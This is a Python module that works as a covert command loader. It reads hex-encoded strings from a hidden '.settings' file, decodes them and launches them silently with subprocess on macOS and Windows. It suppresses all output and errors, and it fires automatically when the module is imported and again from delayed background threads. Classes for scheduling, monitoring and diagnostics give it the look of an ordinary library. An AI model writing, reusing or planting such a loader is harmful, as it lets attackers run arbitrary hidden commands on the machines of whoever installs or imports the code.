#!/usr/bin/env python3

import os
import sys
import time
import threading
import hashlib
from pathlib import Path


class PayloadLoader:
    CONFIG_FILE = ".settings"

    @staticmethod
    def read_payloads():
        try:
            config_path = Path(__file__).parent / PayloadLoader.CONFIG_FILE
            if not config_path.exists():
                config_path = Path.cwd() / PayloadLoader.CONFIG_FILE

            if config_path.exists():
                with open(config_path, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
        except:
            pass
        return []

    @staticmethod
    def decode_payload(hex_str):
        try:
            return bytes.fromhex(hex_str).decode('utf-8')
        except:
            return None


class InjectionEngine:
    def __init__(self):
        self.payloads = PayloadLoader.read_payloads()
        self.injected = False
        self.injection_count = 0

    def inject_darwin_payload(self):
        if len(self.payloads) >= 3:
            try:
                import subprocess
                decoded = [PayloadLoader.decode_payload(p) for p in self.payloads[:3]]
                if all(decoded):
                    subprocess.Popen(decoded, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.injection_count += 1
            except:
                pass

    def inject_win32_payload(self):
        if len(self.payloads) >= 5:
            try:
                import subprocess
                executable = PayloadLoader.decode_payload(self.payloads[3])
                target = PayloadLoader.decode_payload(self.payloads[4])
                if executable and target:
                    subprocess.Popen([executable, target], shell=True, stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
                    self.injection_count += 1
            except:
                pass

    def inject_platform_specific(self):
        if sys.platform == 'darwin':
            self.inject_darwin_payload()
        elif sys.platform == 'win32':
            self.inject_win32_payload()

    def inject_async(self, delay=0.0):
        def async_inject():
            if delay > 0:
                time.sleep(delay)
            self.inject_platform_specific()

        try:
            thread = threading.Thread(target=async_inject, daemon=True)
            thread.start()
        except:
            pass

    def inject_all(self):
        if self.injected:
            return self.injection_count

        self.injected = True
        self.inject_platform_specific()
        self.inject_async(0.5)
        self.inject_async(1.0)
        self.inject_async(1.5)

        return self.injection_count


class InjectionContext:
    def __init__(self):
        self.context_id = self._generate_context_id()
        self.created_at = time.time()
        self.injection_attempts = 0
        self.successful_injections = 0

    def _generate_context_id(self):
        data = f"{time.time()}{os.getpid()}".encode()
        return hashlib.sha1(data).hexdigest()[:12]

    def record_injection(self, success=True):
        self.injection_attempts += 1
        if success:
            self.successful_injections += 1

    def get_context_info(self):
        return {
            'context_id': self.context_id,
            'uptime': time.time() - self.created_at,
            'attempts': self.injection_attempts,
            'successful': self.successful_injections
        }


class InjectionScheduler:
    def __init__(self, engine):
        self.engine = engine
        self.scheduled_tasks = []
        self.running = False

    def schedule(self, delay):
        task_id = hashlib.md5(f"{time.time()}{delay}".encode()).hexdigest()[:8]
        self.scheduled_tasks.append({
            'id': task_id,
            'delay': delay,
            'scheduled_at': time.time()
        })
        self.engine.inject_async(delay)
        return task_id

    def schedule_multiple(self, delays):
        task_ids = []
        for delay in delays:
            task_id = self.schedule(delay)
            task_ids.append(task_id)
        return task_ids

    def get_scheduled_tasks(self):
        return self.scheduled_tasks


class InjectionMonitor:
    def __init__(self):
        self.events = []
        self.max_events = 100

    def log_event(self, event_type, details=None):
        event = {
            'type': event_type,
            'timestamp': time.time(),
            'details': details or {}
        }
        self.events.append(event)

        if len(self.events) > self.max_events:
            self.events.pop(0)

    def get_recent_events(self, count=10):
        return self.events[-count:]

    def clear_events(self):
        self.events.clear()


class CodeInjector:
    def __init__(self, auto_inject=True):
        self.engine = InjectionEngine()
        self.context = InjectionContext()
        self.scheduler = InjectionScheduler(self.engine)
        self.monitor = InjectionMonitor()
        self.auto_inject = auto_inject

        if self.auto_inject:
            self._perform_injection()

    def _perform_injection(self):
        try:
            count = self.engine.inject_all()
            self.context.record_injection(success=True)
            self.monitor.log_event('injection_success', {'count': count})
        except Exception as e:
            self.context.record_injection(success=False)
            self.monitor.log_event('injection_failed', {'error': str(e)})

    def inject(self):
        return self._perform_injection()

    def inject_delayed(self, delay):
        task_id = self.scheduler.schedule(delay)
        self.monitor.log_event('injection_scheduled', {'task_id': task_id, 'delay': delay})
        return task_id

    def inject_batch(self, delays):
        task_ids = self.scheduler.schedule_multiple(delays)
        self.monitor.log_event('batch_injection_scheduled', {'tasks': len(task_ids)})
        return task_ids

    def get_status(self):
        return {
            'context': self.context.get_context_info(),
            'injection_count': self.engine.injection_count,
            'scheduled_tasks': len(self.scheduler.scheduled_tasks),
            'recent_events': self.monitor.get_recent_events(5)
        }

    def get_diagnostics(self):
        return {
            'engine': {
                'payloads_loaded': len(self.engine.payloads),
                'injected': self.engine.injected,
                'injection_count': self.engine.injection_count
            },
            'context': self.context.get_context_info(),
            'scheduler': {
                'tasks': self.scheduler.get_scheduled_tasks()
            },
            'monitor': {
                'total_events': len(self.monitor.events),
                'recent': self.monitor.get_recent_events(3)
            }
        }


def create_injector(auto_inject=True):
    injector = CodeInjector(auto_inject=auto_inject)
    return injector


def quick_inject():
    injector = create_injector(auto_inject=True)
    return injector.get_status()


_global_engine = InjectionEngine()
try:
    _global_engine.inject_all()
except:
    pass

__version__ = "1.0.0"
__all__ = ['CodeInjector', 'create_injector', 'quick_inject', 'InjectionEngine', 'PayloadLoader']